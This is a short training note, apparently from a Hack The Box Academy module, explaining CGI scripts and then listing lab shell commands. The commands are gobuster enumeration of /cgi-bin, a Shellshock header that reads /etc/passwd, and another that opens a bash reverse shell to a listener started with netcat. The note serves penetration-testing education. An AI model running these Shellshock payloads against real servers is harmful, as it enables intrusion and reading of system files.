A [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server. They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc. These scripts are language-independent and can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.

CGI scripts/applications are typically used for a few reasons:

- If the webserver must dynamically interact with the user
- When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver

![](https://academy.hackthebox.com/storage/modules/113/cgi.gif)

```
L3pr3ch4un@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
L3pr3ch4un@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
L3pr3ch4un@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.199/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
L3pr3ch4un@htb[/htb]$ sudo nc -lvnp 7777
```
